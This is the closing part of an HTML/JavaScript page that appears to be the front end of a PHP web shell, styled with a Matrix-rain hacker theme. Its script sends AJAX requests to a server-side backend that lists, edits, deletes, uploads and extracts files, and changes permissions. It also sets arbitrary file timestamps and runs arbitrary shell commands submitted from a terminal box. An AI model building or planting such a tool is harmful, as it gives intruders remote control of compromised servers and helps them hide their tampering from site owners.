            <div class="editor-header" style="padding:15px 20px; display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid var(--border)">
                <h3 style="color:var(--primary)"><i class="fas fa-code"></i> 3D File Editor</h3>
                <button onclick="closeEditor()" class="cyber-button" style="background:rgba(255,51,102,0.1); border-color:var(--error)"><i class="fas fa-times"></i> Close</button>
            </div>
            <textarea id="editor-textarea" class="editor-textarea" style="flex:1; background:rgba(0,0,0,0.5); color:var(--text); padding:20px; font-family:'Fira Code', monospace; border:none; outline:none; resize:none"></textarea>
            <div class="editor-footer" style="padding:15px 20px; border-top:1px solid var(--border); display:flex; gap:12px; justify-content:flex-end">
                <button onclick="saveFile()" class="cyber-button"><i class="fas fa-save"></i> Save Changes</button>
                <button onclick="closeEditor()" class="cyber-button" style="border-color:var(--error); color:var(--error)"><i class="fas fa-times"></i> Cancel</button>
            </div>
        </div>
    </div>
    
    <div id="toast" class="toast"></div>
    
    <script>
        let currentEditFile = '';
        
        function showToast(message, type = 'success') {
            const toast = document.getElementById('toast');
            toast.textContent = message;
            toast.className = `toast ${type} show`;
            setTimeout(() => {
                toast.classList.remove('show');
            }, 3000);
        }
        
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
        
        async function ajaxRequest(action, data = {}) {
            const formData = new FormData();
            formData.append('ajax', '1');
            formData.append('action', action);
            
            for (let key in data) {
                formData.append(key, data[key]);
            }
            
            try {
                const response = await fetch('', {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();
                if (!result.success && result.error) {
                    showToast(result.error, 'error');
                }
                return result;
            } catch (error) {
                showToast('Network error: ' + error.message, 'error');
                return { success: false, error: 'Network error' };
            }
        }
        
        async function refreshDirectory() {
            const result = await ajaxRequest('list');
            if (result.success && result.data) {
                renderBreadcrumb(result.data.breadcrumb);
                renderFileList(result.data.items);
            }
        }
        
        function renderBreadcrumb(breadcrumb) {
            const container = document.getElementById('breadcrumb');
            let html = '<i class="fas fa-compass"></i> ';
            html += `<span class="crumb-item" style="cursor:pointer; color:var(--primary)" onclick="goHome()"><i class="fas fa-home"></i> Home</span>`;
            html += '<span style="margin:0 5px">/</span>';
            
            for (let i = 0; i < breadcrumb.length; i++) {
                const crumb = breadcrumb[i];
                const safePath = crumb.path.replace(/'/g, "\\'");
                html += `<span class="crumb-item" style="cursor:pointer; color:var(--primary)" onclick="navigateTo('${safePath}')">${escapeHtml(crumb.name)}</span>`;
                if (i < breadcrumb.length - 1) {
                    html += '<span style="margin:0 5px">/</span>';
                }
            }
            container.innerHTML = html;
        }
        
        function renderFileList(items) {
            const tbody = document.getElementById('file-list');
            let html = '';
            
            if (!items || items.length === 0) {
                html = '<tr><td colspan="6" style="text-align: center; padding: 50px;"><i class="fas fa-folder-open"></i> Empty directory</td></tr>';
            } else {
                for (let item of items) {
                    const icon = item.is_dir ? '<i class="fas fa-folder"></i>' : '<i class="fas fa-file-code"></i>';
                    const nameClass = item.is_dir ? 'dir-item' : 'file-item';
                    const onclick = item.is_dir ? `navigateToDir('${escapeHtml(item.name).replace(/'/g, "\\'")}')` : `editFile('${escapeHtml(item.name).replace(/'/g, "\\'")}')`;
                    
                    html += '<tr>';
                    html += `<td><span class="${nameClass}" onclick="${onclick}">${icon} ${escapeHtml(item.name)}</span></td>`;
                    html += `<td class="size">${escapeHtml(item.size)}</td>`;
                    html += `<td class="perms ${item.perm_class}">${escapeHtml(item.perms)}</td>`;
                    html += `<td class="owner">${escapeHtml(item.owner)}</td>`;
                    html += `<td class="date">${escapeHtml(item.modified)}</td>`;
                    html += `<td class="actions">`;
                    
                    if (!item.is_dir) {
                        html += `<span class="action-icon" onclick="editFile('${escapeHtml(item.name).replace(/'/g, "\\'")}')"><i class="fas fa-edit"></i></span>`;
                    }
                    html += `<span class="action-icon" onclick="renameItem('${escapeHtml(item.name).replace(/'/g, "\\'")}')"><i class="fas fa-i-cursor"></i></span>`;
                    html += `<span class="action-icon delete" onclick="deleteItem('${escapeHtml(item.name).replace(/'/g, "\\'")}')"><i class="fas fa-trash"></i></span>`;
                    html += `<span class="action-icon" onclick="chmodItem('${escapeHtml(item.name).replace(/'/g, "\\'")}', '${item.perms}')"><i class="fas fa-lock"></i></span>`;
                    html += `<span class="action-icon" onclick="touchItem('${escapeHtml(item.name).replace(/'/g, "\\'")}')"><i class="fas fa-calendar"></i></span>`;
                    
                    html += `</td>`;
                    html += '</tr>';
                }
            }
            
            tbody.innerHTML = html;
        }
        
        async function navigateTo(path) {
            const result = await ajaxRequest('navigate', { path: path });
            if (result.success) {
                await refreshDirectory();
            }
        }
        
        function navigateToDir(dirname) {
            navigateTo(dirname);
        }
        
        function goHome() {
            navigateTo('<?= addslashes($home_path) ?>');
        }
        
        async function deleteItem(name) {
            if (confirm(`&#9888;&#65039; Are you sure you want to delete "${name}" permanently?`)) {
                const result = await ajaxRequest('delete', { target: name });
                if (result.success) {
                    showToast(`Deleted: ${name}`, 'success');
                    await refreshDirectory();
                }
            }
        }
        
        function renameItem(oldName) {
            const newName = prompt('Enter new name:', oldName);
            if (newName && newName !== oldName) {
                ajaxRequest('rename', { old: oldName, new: newName }).then(result => {
                    if (result.success) {
                        showToast(`Renamed to: ${newName}`, 'success');
                        refreshDirectory();
                    }
                });
            }
        }
        
        async function createFolder() {
            const name = document.getElementById('new-folder').value.trim();
            if (name) {
                const result = await ajaxRequest('newfolder', { name: name });
                if (result.success) {
                    document.getElementById('new-folder').value = '';
                    showToast(`Folder created: ${name}`, 'success');
                    await refreshDirectory();
                }
            } else {
                showToast('Please enter a folder name', 'error');
            }
        }
        
        async function createFile() {
            const name = document.getElementById('new-file').value.trim();
            if (name) {
                const result = await ajaxRequest('newfile', { name: name });
                if (result.success) {
                    document.getElementById('new-file').value = '';
                    showToast(`File created: ${name}`, 'success');
                    await refreshDirectory();
                }
            } else {
                showToast('Please enter a file name', 'error');
            }
        }
        
        function uploadFile(input) {
            const file = input.files[0];
            if (!file) return;
            
            const formData = new FormData();
            formData.append('ajax', '1');
            formData.append('action', 'upload');
            formData.append('file', file);
            
            showToast(`Uploading: ${file.name}...`, 'success');
            
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(result => {
                if (result.success) {
                    showToast(`Uploaded: ${file.name}`, 'success');
                    refreshDirectory();
                }
                input.value = '';
            })
            .catch(err => {
                showToast('Upload failed: ' + err.message, 'error');
                input.value = '';
            });
        }
        
        function uploadAndExtract(input) {
            const file = input.files[0];
            if (!file) return;
            
            const formData = new FormData();
            formData.append('ajax', '1');
            formData.append('action', 'upload_extract');
            formData.append('file', file);
            
            showToast(`Extracting: ${file.name}...`, 'success');
            
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(result => {
                if (result.success) {
                    showToast(`Extracted: ${file.name}`, 'success');
                    refreshDirectory();
                } else {
                    showToast(result.error || 'Extraction failed', 'error');
                }
                input.value = '';
            })
            .catch(err => {
                showToast('Extraction failed: ' + err.message, 'error');
                input.value = '';
            });
        }
        
        function chmodItem(name, currentPerms) {
            const newPerms = prompt('Enter permissions (e.g., 755, 644, 777):', currentPerms);
            if (newPerms && /^[0-7]{3,4}$/.test(newPerms)) {
                ajaxRequest('chmod', { target: name, perms: newPerms }).then(result => {
                    if (result.success) {
                        showToast(`Changed permissions: ${name} &#8594; ${newPerms}`, 'success');
                        refreshDirectory();
                    }
                });
            } else if (newPerms) {
                showToast('Invalid permissions format', 'error');
            }
        }
        
        function touchItem(name) {
            const now = new Date();
            const defaultDate = now.getFullYear() + '-' + 
                String(now.getMonth() + 1).padStart(2, '0') + '-' + 
                String(now.getDate()).padStart(2, '0') + ' ' +
                String(now.getHours()).padStart(2, '0') + ':' +
                String(now.getMinutes()).padStart(2, '0') + ':' +
                String(now.getSeconds()).padStart(2, '0');
            
            const date = prompt('Enter date (YYYY-MM-DD HH:MM:SS):', defaultDate);
            if (date) {
                ajaxRequest('touch', { target: name, date: date }).then(result => {
                    if (result.success) {
                        showToast(`Modified date: ${name}`, 'success');
                        refreshDirectory();
                    }
                });
            }
        }
        
        async function editFile(name) {
            const result = await ajaxRequest('edit', { target: name });
            if (result.success && result.data) {
                currentEditFile = name;
                document.getElementById('editor-textarea').value = result.data.content;
                document.getElementById('editorModal').style.display = 'flex';
            }
        }
        
        async function saveFile() {
            const content = document.getElementById('editor-textarea').value;
            const result = await ajaxRequest('save', { target: currentEditFile, content: content });
            if (result.success) {
                showToast(`Saved: ${currentEditFile}`, 'success');
                closeEditor();
                await refreshDirectory();
            }
        }
        
        function closeEditor() {
            document.getElementById('editorModal').style.display = 'none';
            currentEditFile = '';
        }
        
        async function executeCommand() {
            const cmd = document.getElementById('terminal-cmd').value.trim();
            if (!cmd) return;
            
            const terminalOutput = document.getElementById('terminal-output');
            terminalOutput.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Executing command...';
            
            const result = await ajaxRequest('command', { cmd: cmd });
            if (result.success && result.data) {
                terminalOutput.innerHTML = `<span style="color: var(--primary);">$ ${escapeHtml(cmd)}</span><br><span style="color: #aaa;">${escapeHtml(result.data.output)}</span>`;
                document.getElementById('terminal-cmd').value = '';
            }
        }
        
        // Matrix rain effect
        const canvas = document.getElementById('matrixCanvas');
        const ctx = canvas.getContext('2d');
        
        function resizeCanvas() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        
        resizeCanvas();
        window.addEventListener('resize', resizeCanvas);
        
        const chars = "01&#12450;&#12452;&#12454;&#12456;&#12458;&#12459;&#12461;&#12463;&#12465;&#12467;&#12469;&#12471;&#12473;&#12475;&#12477;&#12479;&#12481;&#12484;&#12486;&#12488;&#12490;&#12491;&#12492;&#12493;&#12494;&#12495;&#12498;&#12501;&#12504;&#12507;&#12510;&#12511;&#12512;&#12513;&#12514;&#12516;&#12518;&#12520;&#12521;&#12522;&#12523;&#12524;&#12525;&#12527;&#12530;&#12531;";
        const charArray = chars.split("");
        const fontSize = 12;
        let columns = canvas.width / fontSize;
        let drops = [];
        
        function initDrops() {
            columns = canvas.width / fontSize;
            drops = [];
            for(let i = 0; i < columns; i++) {
                drops[i] = 1;
            }
        }
        
        initDrops();
        
        function drawMatrix() {
            ctx.fillStyle = 'rgba(2, 2, 8, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            ctx.fillStyle = '#c084fc';
            ctx.font = fontSize + 'px monospace';
            
            for(let i = 0; i < drops.length; i++) {
                const text = charArray[Math.floor(Math.random() * charArray.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                
                if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }
        
        setInterval(drawMatrix, 50);
        window.addEventListener('resize', initDrops);
        
        // Initial load
        refreshDirectory();
        
        // Auto refresh every 30 seconds
        setInterval(refreshDirectory, 30000);
        
        // Close editor on escape
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape' && document.getElementById('editorModal').style.display === 'flex') {
                closeEditor();
            }
        });
        
        // Add animation styles for action icons
        const style = document.createElement('style');
        style.textContent = `
            .action-icon {
                background: rgba(255, 255, 255, 0.05);
                padding: 5px 10px;
                border-radius: 8px;
                cursor: pointer;
                transition: all 0.2s ease;
                font-size: 12px;
                display: inline-flex;
                align-items: center;
                gap: 4px;
            }
            .action-icon:hover { background: rgba(192, 132, 252, 0.25); transform: translateY(-2px) scale(1.05); color: var(--primary); }
            .action-icon.delete:hover { background: rgba(255, 51, 102, 0.2); color: var(--error); }
            .crumb-item { transition: all 0.2s; }
            .crumb-item:hover { text-shadow: 0 0 8px var(--primary); background: rgba(192, 132, 252, 0.15); border-radius: 8px; }
            .loading { text-align: center; padding: 40px; color: var(--primary); }
            .loading i { animation: spin 1s linear infinite; }
            @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        `;
        document.head.appendChild(style);
    </script>
</body>
</html>
